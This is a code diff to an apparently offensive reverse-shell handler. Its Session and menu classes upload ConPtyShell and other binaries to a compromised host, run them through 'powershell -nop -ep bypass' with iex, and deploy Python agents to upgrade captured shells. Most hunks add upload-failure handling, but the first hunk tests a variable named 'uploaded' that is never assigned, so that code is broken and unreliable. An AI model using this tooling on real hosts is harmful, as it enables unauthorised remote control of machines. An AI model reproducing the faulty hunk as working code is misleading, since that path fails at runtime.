@@ -1229,7 +1229,11 @@ class MainMenu(BetterCMD):
 		if session.OS == 'Unix':
 			session.upgrade()
 		else:
-			conptyshell_path = session.upload(URLS['conptyshell'], remote_path=session.tmp)[0]
+			session.upload(URLS['conptyshell'], remote_path=session.tmp)
+			if not uploaded:
+				cmdlogger.error("Failed to upload ConPtyShell")
+				return
+			conptyshell_path = uploaded[0]
 			shell_type = 'cmd' if session.subtype == 'cmd' else 'powershell'
 			session.exec(
 				f"powershell -nop -ep bypass -c \"iex(get-content {conptyshell_path} -raw); "
@@ -2058,6 +2062,7 @@ class Session:
 
 			self.upgrade_attempted = False
 			self.upgrade_standalone_attempted = False
+			self.standalone = None
 			self.uploaded_paths = {}
 			self.attaching = False
 
@@ -2199,7 +2204,7 @@ class Session:
 	@property
 	def can_deploy_agent(self):
 		if self._can_deploy_agent is None:
-			if Path(self.directory / ".noagent").exists():
+			if not self.standalone and Path(self.directory / ".noagent").exists():
 				self._can_deploy_agent = False
 			else:
 				_bin = self.bin['python3'] or self.bin['python']
@@ -2403,7 +2408,7 @@ class Session:
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
-						self._bin = dict(zip(binaries, response.decode().splitlines()))
+						self._bin.update(zip(binaries, response.decode().splitlines()))
 
 					missing = [b for b in binaries if not os.path.isabs(self._bin[b])]
 
@@ -2922,13 +2927,15 @@ class Session:
 		answer = ask("Select action: ")
 
 		if answer == "1":
-			return self.upload(url, remote_path="/var/tmp")[0]
+			uploaded = self.upload(url, remote_path="/var/tmp")
+			return uploaded[0] if uploaded else False
 
 		elif answer == "2":
 			local_path = ask(f"Enter {name} local path: ")
 			if local_path:
 				if os.path.exists(local_path):
-					return self.upload(local_path, remote_path=self.tmp)[0]
+					uploaded = self.upload(local_path, remote_path=self.tmp)
+					return uploaded[0] if uploaded else False
 				else:
 					logger.error("The local path does not exist...")
 
@@ -2956,6 +2963,13 @@ class Session:
 			if not self.shell:
 				logger.error("Cannot detect shell. Abort upgrading...")
 				return False
+
+			standalone_file = self.directory / "standalone_python"
+			if not self.standalone and standalone_file.exists():
+				self.standalone = standalone_file.read_text().strip()
+				self._bin['python3'] = self.standalone
+				self._can_deploy_agent = None
+				logger.debug(f"Reusing standalone python from previous shell: {self.standalone}")
 
 			if self.can_deploy_agent:
 				logger.debug("Attempting to deploy Python Agent...")
@@ -2999,8 +3013,15 @@ class Session:
 					raw=True
 				)
 				if not isinstance(response, bytes):
-					logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
-					Path(self.directory / ".noagent").touch()
+					if self.standalone:
+						logger.error("The standalone agent crashed the shell. I am killing it, sorry...")
+						standalone_file = self.directory / "standalone_python"
+						if standalone_file.exists():
+							standalone_file.unlink()
+					else:
+						logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will use a standalone python")
+						Path(self.directory / ".noagent").touch()
+
 					self.kill()
 					return False
 
@@ -3012,6 +3033,8 @@ class Session:
 				self.echoing = True
 				self.prompt = response
 				self.get_shell_info()
+				if self.standalone:
+					(self.directory / "standalone_python").write_text(self.standalone)
 				return True
 
 			if not self.upgrade_standalone_attempted:
@@ -3028,10 +3051,12 @@ class Session:
 						python_binary = self.exec(f'PY_TMP="$(mktemp -d)" && tar -xzf "{python_binary}" -C "$PY_TMP" && export PATH="$PY_TMP/python/bin:$PATH" && ls $PY_TMP/python/bin/python3', value=True)
 						if not python_binary.startswith("/"):
 							logger.error("Failed to deploy standalone python...")
-							return False
-					self._can_deploy_agent = None
-					self._bin['python3'] = python_binary
-					return self.upgrade()
+							python_binary = None
+					if python_binary:
+						self.standalone = python_binary
+						self._can_deploy_agent = None
+						self._bin['python3'] = python_binary
+						return self.upgrade()
 
 			logger.error("Cannot deploy agent...")
 			if readline:
@@ -3249,7 +3274,7 @@ class Session:
 				stderr_stream = self.new_streamID
 
 				if not all([stdout_stream, stderr_stream]):
-					return
+					return []
 
 				code = fr"""
 				from glob import glob
@@ -3533,7 +3558,7 @@ class Session:
 				stderr_stream = self.new_streamID
 
 				if not all([stdin_stream, stderr_stream]):
-					return
+					return []
 
 				code = rf"""
 				import tarfile
@@ -3796,7 +3821,7 @@ class Session:
 		if self.OS == "Unix":
 			if any([self.listener, port, host]):
 
-				if self.listener.jump:
+				if self.listener and self.listener.jump:
 					if len(self.listener.jump) == 1:
 						host, port = self.listener.jump[0]
 					else:
@@ -4666,7 +4691,11 @@ class uac(Module):
 			if not session.system == 'Linux':
 				logger.error(f"This modules runs only on Linux, not on {session.system}.")
 				return False
-			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
+			uploaded = session.upload(URLS['uac_linux'], remote_path=session.tmp)
+			if not uploaded:
+				logger.error("Failed to upload UAC")
+				return False
+			path = uploaded[0]
 			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
 			if not result:
 				logger.info(f"UAC successfully extracted on {session.tmp}")
